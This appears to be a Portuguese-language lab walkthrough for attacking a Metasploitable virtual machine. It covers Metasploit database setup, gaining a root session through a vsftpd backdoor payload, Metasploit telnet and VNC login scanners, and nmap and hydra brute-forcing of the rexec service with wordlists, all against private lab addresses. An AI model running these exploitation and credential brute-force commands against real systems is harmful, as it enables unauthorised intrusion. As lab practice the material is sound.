 Conectando no Bd (Parte mais chata)

sudo apt install postgresql postgresql-contrib &&
sudo service postgresql start

msfdb init
---- dentro do MSFCONSOLE
msfconsole
db_connect msf:msf@127.0.0.1:5432/msf
------------------------------
# criando workspace desse computador
![image](https://github.com/user-attachments/assets/c79ab59f-974d-4781-bb66-693c1e4cff30)
# serviços
![image](https://github.com/user-attachments/assets/e2602863-3e4e-426a-a54a-eca74d17c896)
# informaçoes de host
![image](https://github.com/user-attachments/assets/121e0dc0-f0ed-43af-81b0-7d5af6a9aaee)
# Procurando diretorios escondidos
![image](https://github.com/user-attachments/assets/f4ec5416-ea24-4f5a-8234-1894a40596b9)


Depois de conseguir acesso como root usando o payload de:
CRTL + Z ;
Y ;

sessions
para acessar a sessao ;
sessions -i 2 ;

![image](https://github.com/user-attachments/assets/e4c0a2cc-9ec0-4e06-9f0f-3e3448ace42d)


```bash
meu ip: 177.67.136.88
ip kali: 172.24.49.254
ip meta : 192.168.100.102

PAYLOAD cmd/unix/interact = vsft 3.2.4
PAYLOAD auxiliary/scanner/telnet/telnet_login = telnet 23

PAYLOAD scanner/vnc/vnc_login = VNC  ~~~ depois entrar com vncviewer 192.168.100.102:5900 :password

nmap -p 512 --script rexec-brute -v 192.168.100.102 ~~~~ pesquisar rexec_login e usar uns dos logins

┌──(luan㉿192.168.100.102)-[~/Desktop/porta_512_logins]
└─$ hydra -L /home/luan/Desktop/porta_512_logins/usuarios_512.txt -P /home/luan/Desktop/porta_512_logins/passwd_512.txt -vV 192.168.100.102 rexec

``` 
